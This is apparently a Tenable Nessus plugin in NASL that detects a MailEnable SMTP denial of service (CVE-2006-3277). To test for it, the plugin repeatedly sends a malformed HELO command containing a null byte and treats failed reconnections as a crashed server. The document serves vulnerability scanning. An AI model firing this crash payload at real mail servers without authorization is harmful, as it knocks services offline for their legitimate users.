#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21771);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2006-3277");
  script_bugtraq_id(18630);
  script_xref(name:"OSVDB", value:"26791");

  script_name(english:"MailEnable SMTP Server HELO Command Remote DoS");
  script_summary(english:"Tries to crash MailEnable SMTP server");

 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server is susceptible to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running MailEnable, a commercial mail server for
Windows. 

According to the version number in its banner, the SMTP server bundled
with the installation of MailEnable on the remote host will crash when
handling malformed HELO commands.  An unauthenticated attacker may be
able to leverage this issue to deny service to legitimate users." );
 script_set_attribute(attribute:"see_also", value:"http://www.divisionbyzero.be/?p=173" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/438374/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.divisionbyzero.be/?p=174" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2006-06/0664.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.mailenable.com/hotfix/" );
 script_set_attribute(attribute:"solution", value:
"Apply the ME-10013 hotfix referenced in the vendor link above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"SMTP problems");
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");
  script_dependencie("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_exclude_keys("SMTP/wrapped");

  exit(0);
}


include("global_settings.inc");
include("smtp_func.inc");


if ( report_paranoia < 2 ) exit(0); # FPs
port = get_kb_item("Services/smtp");
if (!port) port = 25;
if (!get_port_state(port)) exit(0);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);


# Make sure the banner corresponds to MailEnable.
banner = get_smtp_banner(port:port);
if (
  !banner || 
  !egrep(pattern:"Mail(Enable| Enable SMTP) Service", string:banner)
) exit(0);


# Try to crash the daemon.
c = raw_string("HELO ", raw_string(0), "x99\r\n");

failed = 0;
tries = 100;
for (iter=1; iter <= tries; iter++)
{
  # Try to crash the daemon.
  soc = open_sock_tcp(port);
  if (soc)
  {
    failed = 0;
    send(socket:soc, data:c);
    close(soc);
  }
  else
  {
    sleep(1);

    # Call it a problem if we see three consecutive failures to connect.
    if (++failed > 2)
    {
        security_warning(port);
        exit(0);
    }
  }
}
